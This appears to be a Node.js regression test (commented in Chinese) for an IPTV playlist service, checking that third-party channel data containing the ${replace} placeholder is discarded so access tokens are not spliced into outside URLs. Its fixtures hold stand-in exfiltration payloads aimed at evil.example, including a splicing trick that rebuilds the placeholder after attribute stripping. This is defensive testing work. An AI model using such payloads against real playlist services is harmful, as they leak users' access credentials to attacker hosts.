#!/usr/bin/env node
/**
 * 外来数据里的本机地址占位符 ${replace} 回归测试。
 *
 * 背景：interfaceStr 对外输出播放列表时，把 ${replace} 整篇替换成「本机地址 + 访问前缀」
 * （/<pass> 或 /u/<token>）。第三方订阅的播放地址、台标、频道名、#EXTVLCOPT 里写一个，
 * 凭据就被拼进指向第三方的地址，播放器播放、取台标时发给对方。
 *
 * 不变量：
 *  - 汇总频道时，name / url / playURL / logo / pics / pID / deferredRef 带占位符的外来频道整条丢弃，
 *    分组名带它的整组丢弃；干净频道不受影响；
 *  - 先丢弃再去重：带占位符的条目排在前面时，同名同地址的干净条目不能被当成重复删掉；
 *  - opts 里带占位符的那条拒收；
 *  - 端到端：订阅 → 保存 → 重新生成 → 对外输出（m3u / txt、带配置档与否），第三方地址里
 *    不出现访问令牌；本项目自己的占位地址照常展开；
 *  - 拼接：第三方地址行 / #EXTVLCOPT 里写 `${re source-ids="x"place}`，输出时剥离内部属性
 *    不能把它拼成占位符再展开（interfaceStr 先展开、后剥离）。
 *
 * 运行： node scripts/test-replace-token.mjs   （或 npm test）
 */
import assert from 'node:assert/strict'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

const TMP = mkdtempSync(join(tmpdir(), 'iptv-replace-token-test-'))
process.env.mdataDir = TMP
process.env.mblank = 'true'                 // 不联网：关掉咪咕和内置内容
process.env.menableLogoCache = 'false'
process.env.mexternalLogoBase = ''
process.env.menableTvgNormalize = 'false'
process.env.menableDisplayNameUnify = 'false'

const { dropForeignReplaceTokens } = await import('../utils/channelMerger.js')
const { sanitizeOpts } = await import('../utils/channelOpts.js')
const { hasReplaceToken } = await import('../utils/replaceToken.js')
const { saveExternalSourcesAPI } = await import('../utils/adminAPI.js')
const { interfaceStr } = await import('../utils/appUtils.js')

let passed = 0
const check = async (name, fn) => { await fn(); passed++; console.log(`  ✅ ${name}`) }

console.log('外来数据 ${replace} 占位符回归测试')

const T = '${replace}'

try {
  // ---- 汇总时丢弃 ----
  await check('hasReplaceToken：字符串、数字、空值', () => {
    assert.equal(hasReplaceToken(`http://evil/?h=${T}`), true)
    assert.equal(hasReplaceToken('http://h/a.m3u8'), false)
    assert.equal(hasReplaceToken(608807420), false)
    assert.equal(hasReplaceToken(undefined), false)
    assert.equal(hasReplaceToken(null), false)
  })

  await check('汇总：任一外来字段带占位符的频道整条丢弃，干净频道不动', () => {
    const groups = [{ name: 'G', dataList: [
      { name: '干净', url: 'http://h/ok.m3u8', logo: 'http://h/ok.png' },
      { name: `名${T}`, url: 'http://h/1.m3u8' },
      { name: '地址', url: `http://evil/1.m3u8?h=${T}` },
      { name: '内置', playURL: `http://evil/2.m3u8?h=${T}` },
      { name: '台标', url: 'http://h/3.m3u8', logo: `http://evil/l.png?h=${T}` },
      { name: '咪咕台标', pID: '1', pics: { highResolutionH: `http://evil/p.png?h=${T}` } },
      { name: '模块', deferredRef: `x${T}` },
      { name: 'pID', pID: `1${T}` },
    ] }]
    const { groups: out, removed } = dropForeignReplaceTokens(groups)
    assert.equal(removed, 7)
    assert.deepEqual(out[0].dataList.map(c => c.name), ['干净'])
  })

  await check('汇总：返回被丢频道的源归属（去重），日志据此点名', () => {
    const { sources } = dropForeignReplaceTokens([
      { name: 'G', dataList: [
        { name: 'A', url: `http://evil/?${T}`, sourceId: 'ext:aa000001' },
        { name: 'B', logo: `http://evil/?${T}`, url: 'http://h/b.m3u8', sourceId: 'ext:aa000001' },
        { name: 'C', pID: '1', pics: { highResolutionH: `http://evil/?${T}` } },
        { name: 'D', url: 'http://h/d.m3u8', sourceId: 'ext:bb000002' },
      ] },
    ])
    assert.deepEqual(sources.sort(), ['ext:aa000001', 'migu'])
  })

  await check('汇总：分组名带占位符整组丢弃；因此被清空的分组一并去掉，本来就空的分组保留', () => {
    const { groups: out, removed } = dropForeignReplaceTokens([
      { name: `组${T}`, dataList: [{ name: 'A', url: 'http://h/a.m3u8' }] },
      { name: '全坏', dataList: [{ name: 'B', url: `http://evil/?${T}` }] },
      { name: '本来就空', dataList: [] },
      { name: '好', dataList: [{ name: 'C', url: 'http://h/c.m3u8' }] },
    ])
    assert.equal(removed, 2)
    assert.deepEqual(out.map(g => g.name), ['本来就空', '好'])
  })

  await check('opts：带占位符的那条拒收，其余照常', () => {
    assert.deepEqual(sanitizeOpts([`http-referrer=http://evil/?h=${T}`, 'http-user-agent=Mozilla/5.0']), ['http-user-agent=Mozilla/5.0'])
  })

  // ---- 端到端：订阅 → 保存 → 重新生成 → 对外输出 ----
  const subscription = [
    '#EXTM3U',
    '#EXTINF:-1 group-title="外部",干净台',
    'http://cdn.example/ok.m3u8',
    '#EXTINF:-1 group-title="外部",坏地址台',
    `http://evil.example/live.m3u8?h=${T}`,
    `#EXTINF:-1 tvg-logo="http://evil.example/logo.png?h=${T}" group-title="外部",坏台标台`,
    'http://cdn.example/logo.m3u8',
    `#EXTINF:-1 group-title="外部",坏名${T}台`,
    'http://cdn.example/name.m3u8',
    `#EXTINF:-1 group-title="坏组${T}",坏组台`,
    'http://cdn.example/group.m3u8',
    '#EXTINF:-1 group-title="外部",坏请求头台',
    `#EXTVLCOPT:http-referrer=http://evil.example/?h=${T}`,
    'http://cdn.example/opt.m3u8',
    // 同名同地址：带占位符的排在前面，干净的不能被当成重复删掉
    `#EXTINF:-1 tvg-logo="http://evil.example/dup.png?h=${T}" group-title="外部",重复台`,
    'http://cdn.example/dup.m3u8',
    '#EXTINF:-1 tvg-logo="http://cdn.example/dup.png" group-title="外部",重复台',
    'http://cdn.example/dup.m3u8',
    // 不含字面量占位符、汇总时拦不住的拼接写法：剥掉中间的 source-ids 正好拼出 ${replace}
    '#EXTINF:-1 group-title="外部",拼接地址台',
    'http://evil.example/splice.m3u8?k=${re source-ids="x"place}',
    '#EXTINF:-1 group-title="外部",拼接请求头台',
    '#EXTVLCOPT:http-referrer=http://evil.example/?k=${re source-ids="x"place}',
    'http://cdn.example/splice-opt.m3u8',
  ].join('\n')

  await check('端到端：保存订阅后重新生成，interface.txt 里第三方内容不带占位符', async () => {
    const r = await saveExternalSourcesAPI({
      enabled: true, includeInPlaylists: true, updateOnStartup: true,
      sources: [
        { id: 'rt000001', name: '恶意订阅', mode: 'subscription', enabled: true, subscriptionContent: subscription },
        { id: 'rt000002', name: '坏直连', mode: 'direct', enabled: true, group: '外部', m3u8Url: `http://evil.example/direct.m3u8?h=${T}` },
      ],
    })
    assert.notEqual(r.success, false, r.message)
    const txt = readFileSync(join(TMP, 'interface.txt'), 'utf-8')
    const extinf = txt.split('\n').filter(l => l.startsWith('#EXTINF:'))
    const names = extinf.map(l => l.slice(l.lastIndexOf(',') + 1))
    assert.ok(names.includes('干净台'), names.join(' / '))
    assert.ok(names.includes('坏请求头台'), '只丢那条请求头，频道保留')
    for (const bad of ['坏地址台', '坏台标台', `坏名${T}台`, '坏组台', '坏直连']) assert.ok(!names.includes(bad), bad)
    assert.equal(names.filter(n => n === '重复台').length, 1, '干净的重复台留下了')
    assert.ok(extinf.find(l => l.endsWith(',重复台')).includes('tvg-logo="http://cdn.example/dup.png"'))
    // 文件里剩下的占位符只能出现在本项目自己生成的位置
    for (const line of txt.split('\n').filter(hasReplaceToken)) {
      assert.ok(line.startsWith('#EXTM3U ') || /^\$\{replace\}\//.test(line) || /tvg-logo="\$\{replace\}\//.test(line), line)
    }
  })

  writeFileSync(join(TMP, 'my-playlist-config.renamed.json'), JSON.stringify({ groupRenameMap: { 外部: '第三方' } }))
  for (const profile of ['default', 'renamed']) {
    for (const path of ['/m3u', '/txt']) {
      await check(`对外输出（${profile} 档 ${path}）：访问令牌不进任何第三方地址，本项目占位地址照常展开`, () => {
        const out = String(interfaceStr(path, { host: 'localhost:1905' }, '', '', profile, '/u/SECRET-TOKEN', '').content)
        assert.ok(!/(evil|cdn)\.example[^\n]*SECRET-TOKEN/.test(out), out)
        // 拼接写法剥离后会剩下一个没展开的字面量占位符，只会出现在第三方的垃圾地址里，不带凭据
        for (const line of out.split('\n').filter(hasReplaceToken)) assert.ok(line.includes('evil.example'), line)
        assert.ok(out.includes('http://cdn.example/ok.m3u8'))
        if (path === '/m3u') assert.ok(out.includes('x-tvg-url="http://localhost:1905/u/SECRET-TOKEN/playback.xml"'))
      })
    }
  }

  console.log(`\n全部 ${passed} 项通过`)
} finally {
  rmSync(TMP, { recursive: true, force: true })
}
// update() 会留下定时器等句柄，测完直接退出
process.exit(0)
